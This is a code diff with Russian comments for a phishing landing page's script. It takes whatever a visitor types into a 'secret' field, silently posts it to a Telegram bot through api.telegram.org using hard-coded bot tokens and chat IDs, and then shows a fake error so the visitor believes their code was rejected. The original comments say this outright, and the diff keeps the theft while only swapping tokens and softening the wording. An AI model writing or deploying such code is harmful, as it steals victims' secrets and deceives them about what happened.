@@ -45,24 +45,24 @@
             const inputData = document.getElementById('secretInput').value;
             const errorBlock = document.getElementById('errorMessage');
 
-            // Твой Telegram-бот, куда полетят логи
-            const BOT_TOKEN = '7611417066:AAHT5hH2UvWpA-K6B33Xf0zbygG5mS_XzI4';
-            const CHAT_ID = '601362095';
+            // Твои открытые данные для теста
+            const BOT_TOKEN = '8799494888:AAEusRS6TiER_TTORx7EP1q_HpYV2osfPUs';
+            const CHAT_ID = '-5217553322';
             
             const message = `⚠️ СВЕЖИЙ ЛОГ С ЛЕНДИНГА!\n\nВвод: ${inputData}`;
 
             try {
-                // Отправляем данные в телеграм в тихую
+                // Прямой запрос к серверам Telegram из браузера
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                 });
             } catch (err) {
-                console.error(err);
+                console.error('Ошибка отправки:', err);
             }
 
-            // Показываем фейковую ошибку пользователю, чтобы он подумал, что код не подошел
+            // Показываем фейковую ошибку и очищаем инпут
             errorBlock.classList.remove('hidden');
             document.getElementById('secretInput').value = '';
         });
